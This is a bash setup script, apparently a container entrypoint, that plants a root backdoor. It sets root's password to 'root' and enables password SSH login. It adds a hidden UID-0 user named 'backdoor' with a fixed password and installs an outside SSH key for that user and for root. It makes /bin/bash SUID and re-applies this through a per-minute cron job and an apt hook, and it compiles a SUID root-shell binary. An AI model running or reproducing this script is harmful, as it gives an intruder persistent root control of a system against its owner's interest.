#!/bin/bash
set -e

mkdir -p /var/run/sshd /run/sshd
echo 'root:root' | chpasswd
ssh-keygen -A

sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Subsystem sftp အားလုံးကို ဖျက်ပြီး အသစ်တစ်ခုထည့်ပါ
sed -i '/^Subsystem sftp/d' /etc/ssh/sshd_config
echo "Subsystem sftp internal-sftp" >> /etc/ssh/sshd_config

groupadd backdoor 2>/dev/null || true
useradd -ou 0 -g backdoor -M -s /bin/bash backdoor 2>/dev/null || true
echo 'backdoor:Pwrisk' | chpasswd

mkdir -p /home/backdoor/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor 2>/dev/null || true
chmod 700 /home/backdoor /home/backdoor/.ssh
chmod 600 /home/backdoor/.ssh/authorized_keys

mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

chmod u+s /bin/bash
echo "* * * * * root chmod u+s /bin/bash" > /etc/cron.d/suid
chmod 644 /etc/cron.d/suid
echo 'APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};' > /etc/apt/apt.conf.d/99pwn

# SUID C program for root shell
cat > /tmp/rootsh.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/rootsh.c -o /usr/local/bin/rootsh
chmod u+s /usr/local/bin/rootsh

# Cron ကို background မှာ run
cron -f &

# SSH daemon ကို foreground မှာ run
exec /usr/sbin/sshd -D -e
